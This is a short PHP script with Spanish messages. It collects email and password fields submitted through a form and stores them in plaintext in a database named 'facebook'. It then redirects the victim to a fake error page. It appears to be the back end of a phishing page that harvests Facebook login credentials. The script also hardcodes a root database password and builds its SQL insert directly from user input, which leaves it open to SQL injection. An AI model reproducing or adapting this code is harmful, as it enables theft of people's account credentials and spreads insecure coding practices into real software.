<?php
$servername = "localhost"; 
$username = "root";   
$password = "furioso222"; 
$dbname = "facebook"; 

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
        echo "Formulario enviado correctamente.";
        
        $correo = $_POST['correo'];
        $password = $_POST['password'];
    
        $sql = "INSERT INTO datos (correo, password) VALUES ('$correo', '$password')";
    
        if ($conn->query($sql) === TRUE) {
            header("Location: error404.html");
        } else {
            echo "Error: " . $sql . "<br>" . $conn->error;
        }
    }
    
    $conn->close();    

?>